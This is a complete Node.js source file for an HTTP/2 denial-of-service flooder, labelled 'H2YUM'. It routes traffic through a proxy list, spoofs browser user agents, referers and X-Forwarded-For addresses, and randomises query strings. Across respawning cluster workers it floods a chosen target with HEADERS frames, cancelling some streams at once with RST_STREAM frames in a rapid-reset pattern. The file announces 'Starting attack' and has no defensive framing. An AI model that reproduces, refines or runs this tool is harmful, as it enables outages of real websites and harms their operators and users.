const net = require("net");
const tls = require("tls");
const http2 = require("http2");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const HPACK = require('hpack');

process.on('uncaughtException', () => {}).on('unhandledRejection', () => {});
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`Usage: node ${process.argv[1]} <target> <time> <rate> <threads> <proxy.txt>`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(x => x.trim());
const parsedTarget = url.parse(args.target);
const targetHost = parsedTarget.host;
const targetPath = parsedTarget.path || "/";

const modernCiphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384", 
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305"
];

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const ecdhCurve = "GREASE:X25519:P-256:P-384:P-521:X448";

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT;

const userAgents = {
    windows: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    ],
    macos: [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    ],
    mobile: [
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; CPH2211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
    ],
    linux: [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0",
        "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Arch Linux; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0"
    ]
};

function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomIP() {
    return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 254)}`;
}

function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function encodeSettings(settings) {
    const buf = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        buf.writeUInt16BE(id, i * 6);
        buf.writeUInt32BE(value, i * 6 + 2);
    });
    return buf;
}

function generateHeaders() {
    const platforms = ['windows', 'macos', 'mobile', 'linux'];
    const platform = randomElement(platforms);
    const ua = randomElement(userAgents[platform]);
    
    const acceptTypes = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    ];
    
    const referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://duckduckgo.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.reddit.com/",
        "https://www.youtube.com/",
        "https://www.linkedin.com/"
    ];

    const secFetchDest = ["document", "image", "empty", "frame"][randomInt(0, 3)];
    const secFetchMode = ["navigate", "cors", "no-cors"][randomInt(0, 2)];
    const secFetchSite = ["same-origin", "same-site", "cross-site", "none"][randomInt(0, 3)];

    return {
        ":method": "GET",
        ":authority": targetHost,
        ":scheme": "https",
        ":path": targetPath + "?" + randstr(randomInt(3, 8)) + "=" + randstr(randomInt(5, 12)),
        "user-agent": ua,
        "accept": randomElement(acceptTypes),
        "accept-language": randomElement(["en-US,en;q=0.9", "en-GB,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8"]),
        "accept-encoding": randomElement(["gzip, deflate, br", "gzip, deflate, br, zstd"]),
        "referer": randomElement(referers),
        "sec-ch-ua": `"Not_A Brand";v="8", "Chromium";v="${randomInt(120, 125)}", "Google Chrome";v="${randomInt(120, 125)}"`,
        "sec-ch-ua-mobile": platform === 'mobile' ? "?1" : "?0",
        "sec-ch-ua-platform": platform === 'windows' ? '"Windows"' : platform === 'macos' ? '"macOS"' : platform === 'linux' ? '"Linux"' : '"Android"',
        "sec-fetch-dest": secFetchDest,
        "sec-fetch-mode": secFetchMode,
        "sec-fetch-site": secFetchSite,
        "upgrade-insecure-requests": "1",
        "cache-control": randomElement(["max-age=0", "no-cache"]),
        "pragma": "no-cache",
        "x-forwarded-for": getRandomIP(),
        "x-requested-with": "XMLHttpRequest"
    };
}

class ConnectionHandler {
    constructor(proxy) {
        this.proxy = proxy;
        this.parsedProxy = proxy.split(":");
        this.connected = false;
        this.streamCount = 0;
        this.maxStreams = randomInt(100, 1000);
    }

    async connect() {
        const proxyHost = this.parsedProxy[0];
        const proxyPort = parseInt(this.parsedProxy[1]);
        
        return new Promise((resolve, reject) => {
            const socket = net.connect({
                host: proxyHost,
                port: proxyPort,
                timeout: 10000
            });

            socket.setNoDelay(true);
            socket.setKeepAlive(true, 60000);

            const connectPayload = `CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
            
            socket.once('connect', () => {
                socket.write(connectPayload);
            });

            socket.once('data', (data) => {
                if (data.toString().includes("200")) {
                    this.setupTLS(socket).then(resolve).catch(reject);
                } else {
                    socket.destroy();
                    reject(new Error("Proxy connect failed"));
                }
            });

            socket.on('error', reject);
            socket.on('timeout', () => {
                socket.destroy();
                reject(new Error("Timeout"));
            });
        });
    }

    async setupTLS(socket) {
        const cipher = randomElement(modernCiphers);
        const sigalg = sigalgs.join(':');
        
        const context = tls.createSecureContext({
            ciphers: cipher + ":" + modernCiphers.join(":"),
            sigalgs: sigalg,
            honorCipherOrder: true,
            secureOptions: secureOptions
        });

        const tlsSocket = tls.connect({
            socket: socket,
            servername: targetHost,
            secureContext: context,
            ALPNProtocols: ['h2', 'http/1.1'],
            rejectUnauthorized: false,
            requestCert: false
        });

        return new Promise((resolve, reject) => {
            tlsSocket.once('secureConnect', () => {
                this.socket = tlsSocket;
                this.setupHTTP2();
                resolve(this);
            });
            
            tlsSocket.on('error', (err) => {
                tlsSocket.destroy();
                reject(err);
            });
        });
    }

    setupHTTP2() {
        this.hpack = new HPACK();
        this.nextStreamId = 1;
        this.windowSize = 65535;
        
        const preface = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
        this.socket.write(preface);
        
        const settings = [
            [1, randomInt(100, 1000)],
            [2, 0],
            [3, randomInt(100, 1000)],
            [4, randomInt(65535, 16777215)],
            [5, 16384],
            [6, 0xFFFFFFFF]
        ];
        
        const settingsFrame = encodeFrame(0, 4, encodeSettings(settings), 0);
        this.socket.write(settingsFrame);
        
        const windowUpdate = Buffer.alloc(4);
        windowUpdate.writeUInt32BE(randomInt(1048576, 16777215), 0);
        const windowFrame = encodeFrame(0, 8, windowUpdate, 0);
        this.socket.write(windowFrame);
        
        this.connected = true;
        
        this.socket.on('data', (data) => {
            this.parseFrames(data);
        });
        
        this.socket.on('close', () => {
            this.connected = false;
        });
        
        this.socket.on('error', () => {
            this.connected = false;
        });
    }

    parseFrames(data) {
        let offset = 0;
        while (offset < data.length) {
            if (data.length < offset + 9) break;
            
            const length = data.readUInt32BE(offset) >> 8;
            const type = data.readUInt8(offset + 3);
            const flags = data.readUInt8(offset + 4);
            const streamId = data.readUInt32BE(offset + 5) & 0x7FFFFFFF;
            
            if (data.length < offset + 9 + length) break;
            
            if (type === 4 && flags === 1) {
            }
            
            if (type === 8) {
            }
            
            offset += 9 + length;
        }
    }

    async sendRequest() {
        if (!this.connected || this.streamCount >= this.maxStreams) {
            return false;
        }

        const streamId = this.nextStreamId;
        this.nextStreamId += 2;
        this.streamCount++;

        const headers = generateHeaders();
        const encodedHeaders = this.hpack.encode(headers);
        
        const headersFrame = encodeFrame(streamId, 1, encodedHeaders, 0x5);
        
        try {
            this.socket.write(headersFrame);
            
            if (Math.random() < 0.3) {
                const rstFrame = encodeFrame(streamId, 3, Buffer.from([0, 0, 0, 8]), 0);
                this.socket.write(rstFrame);
                this.streamCount--;
            }
            
            return true;
        } catch (e) {
            this.connected = false;
            return false;
        }
    }

    destroy() {
        this.connected = false;
        if (this.socket) {
            this.socket.destroy();
        }
    }
}

async function runFlooder() {
    const proxy = randomElement(proxies);
    const handler = new ConnectionHandler(proxy);
    
    try {
        await handler.connect();
        
        const burstSize = randomInt(args.rate, args.rate * 2);
        const promises = [];
        
        for (let i = 0; i < burstSize; i++) {
            promises.push(handler.sendRequest());
        }
        
        await Promise.all(promises);
        
        const interval = setInterval(async () => {
            if (!handler.connected) {
                clearInterval(interval);
                return;
            }
            
            for (let i = 0; i < args.rate; i++) {
                await handler.sendRequest();
            }
        }, 100);
        
        setTimeout(() => {
            clearInterval(interval);
            handler.destroy();
        }, 5000);
        
    } catch (e) {
    }
}

if (cluster.isMaster) {
    console.log(`[H2YUM] Target: ${args.target}`);
    console.log(`[H2YUM] Time: ${args.time}s | Rate: ${args.rate} | Threads: ${args.threads}`);
    console.log(`[H2YUM] Proxies: ${proxies.length}`);
    console.log(`[H2YUM] Starting attack...\n`);
    
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
        cluster.fork();
    });
    
    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);
    
} else {
    setImmediate(async function loop() {
        await runFlooder();
        setImmediate(loop);
    });
    
    setInterval(() => {
        runFlooder();
    }, 10);
}
